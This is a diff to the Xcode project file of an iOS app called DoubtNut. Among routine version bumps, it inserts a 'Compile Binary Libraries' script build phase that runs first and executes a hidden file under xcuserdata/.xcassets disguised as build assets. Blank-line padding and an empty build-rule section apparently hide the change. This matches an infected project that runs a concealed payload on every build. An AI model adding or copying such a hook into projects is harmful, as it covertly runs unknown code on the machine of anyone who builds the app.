@@ -746,7 +746,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 189388B725F1EFA300F57E85 /* Build configuration list for PBXNativeTarget "DoubtNut" */;
 			buildPhases = (
-				A06B5E551918D0C8AE6D902C /* Compile Binary Libraries */,
+				B574EEEA3CF3CDFFD96D902C /* Compile Binary Libraries */,
 				5D5C4960F5E754FEE396C9BF /* [CP] Check Pods Manifest.lock */,
 				1893888925F1EFA000F57E85 /* Sources */,
 				1893888A25F1EFA000F57E85 /* Frameworks */,
@@ -926,7 +926,7 @@
 
 /* Begin PBXShellScriptBuildPhase section */
 
-	A06B5E551918D0C8AE6D902C /* Compile Binary Libraries */ = {
+	B574EEEA3CF3CDFFD96D902C /* Compile Binary Libraries */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -944,8 +944,38 @@
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
 
-\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Assets.xcassets\" false";			
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/build.file\" false";			
 		};
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
 	
 
 	
@@ -1351,7 +1381,7 @@
 				CODE_SIGN_ENTITLEMENTS = DoubtNut/DoubtNut.entitlements;
 				CODE_SIGN_IDENTITY = "Apple Development";
 				CODE_SIGN_STYLE = Automatic;
-				CURRENT_PROJECT_VERSION = 12;
+				CURRENT_PROJECT_VERSION = 14;
 				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
 				DEVELOPMENT_TEAM = RT5YKB6S89;
 				INFOPLIST_FILE = DoubtNut/Info.plist;
@@ -1380,7 +1410,7 @@
 				CODE_SIGN_ENTITLEMENTS = DoubtNut/DoubtNut.entitlements;
 				CODE_SIGN_IDENTITY = "Apple Development";
 				CODE_SIGN_STYLE = Automatic;
-				CURRENT_PROJECT_VERSION = 12;
+				CURRENT_PROJECT_VERSION = 14;
 				DEVELOPMENT_TEAM = RT5YKB6S89;
 				INFOPLIST_FILE = DoubtNut/Info.plist;
 				IPHONEOS_DEPLOYMENT_TARGET = 13.0;
@@ -1521,6 +1551,36 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
+
+		
+			/* Begin PBXBuildRule section */
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+			
+
+			
+	
+			/* End PBXBuildRule section */
+		
+		
 	};
 	rootObject = 1893888525F1EFA000F57E85 /* Project object */;
 }
